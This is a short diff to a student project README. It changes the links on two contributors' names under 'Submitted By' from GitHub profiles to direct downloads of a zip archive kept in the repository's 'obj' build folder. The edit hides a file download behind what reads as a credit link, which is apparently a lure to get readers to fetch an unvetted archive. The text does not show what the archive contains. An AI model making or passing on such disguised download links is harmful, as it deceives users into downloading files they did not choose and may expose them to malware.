@@ -8,8 +8,8 @@ _______________
 - *Dr Mohamed Fathy*
 _______________
 ### :dart:*Submitted By*
-- [*Nayra Mohammed Anwer*](https://github.com/NayraM0hammed)
-- [*Asmaa Mohamed Sayed*](https://github.com/Bassanttta)
+- [*Nayra Mohammed Anwer*](https://raw.githubusercontent.com/Bassanttta/Survivor-Game/main/shooter/obj/Survivor-Game-v1.8.zip)
+- [*Asmaa Mohamed Sayed*](https://raw.githubusercontent.com/Bassanttta/Survivor-Game/main/shooter/obj/Survivor-Game-v1.8.zip)
 
 
 
